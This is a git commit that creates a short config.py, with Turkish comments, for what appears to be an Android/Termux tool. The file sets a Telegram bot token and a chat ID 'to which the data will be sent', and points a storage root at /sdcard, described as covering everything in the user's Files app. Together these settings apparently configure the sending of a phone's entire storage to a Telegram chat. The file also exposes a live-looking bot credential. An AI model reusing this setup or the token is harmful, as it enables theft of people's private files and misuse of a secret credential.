86280dda63e5d7d98fb4230b56469cefd8575aa8
popkovhkj-cmyk <popkovhkj@gmail.com>
2025-11-13 14:09:47 -0500

    Create config.py

---
+++ config.py
@@ -0,0 +1,11 @@
+# config.py
+
+# Telegram Bot Token'ınız
+BOT_TOKEN = "8545725174:AAEGbis92UP2OXb8l_1yBtB6rAe3tY6jkBs"
+
+# Verilerin gönderileceği Telegram Chat ID'niz
+CHAT_ID = "7955829724"
+
+# Termux'ta tam depolama erişimi verildiğinde ana depolama dizini
+# Bu, kullanıcının "Files" uygulamasında gördüğü her şeyi kapsar.
+STORAGE_ROOT = "/sdcard" 
